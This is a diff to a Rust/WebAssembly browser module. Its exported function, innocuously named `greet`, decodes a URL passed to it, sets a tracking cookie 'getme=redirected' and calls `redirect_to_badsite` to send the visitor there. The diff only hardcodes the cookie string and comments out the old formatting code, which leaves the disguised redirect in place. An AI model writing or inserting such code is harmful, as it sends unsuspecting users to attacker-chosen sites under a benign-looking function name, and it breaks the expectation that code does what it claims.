@@ -2,17 +2,19 @@
 use wasm_bindgen::prelude::*;
 use web_sys::{window, HtmlDocument, Document, Location};
 
-fn set_cookie(name: &str, value: &str) -> Result<(), JsValue> {
+fn set_cookie() -> Result<(), JsValue> {
     let window = window().ok_or("no global window exists")?;
     let document: Document = window.document().ok_or("no document exists")?;
     let html_document: HtmlDocument = document.dyn_into::<HtmlDocument>()?;
-
+    /* Cookie string is built from the following values. However, we have hardcoded as the format library is quite large.
     let cookie = format!(
         "{}={}; max-age={}; path=/; samesite=lax",
         name,
         value,
         24 * 60 * 60
     );
+    */
+    let cookie: &'static str = "getme=redirected; max-age=86400; path=/; samesite=lax";
     
     html_document.set_cookie(&cookie)?;
     Ok(())
@@ -49,7 +51,7 @@ fn decode_url(encoded_url: &str) -> Result<String, JsValue> {
 #[wasm_bindgen]
 pub fn greet(name: &str) -> Result<(), JsValue> {
     let decoded_url = decode_url(name)?;
-    set_cookie("get", "redirected")?;
+    set_cookie()?;
     redirect_to_badsite(&decoded_url)?;
     Ok(())
 }
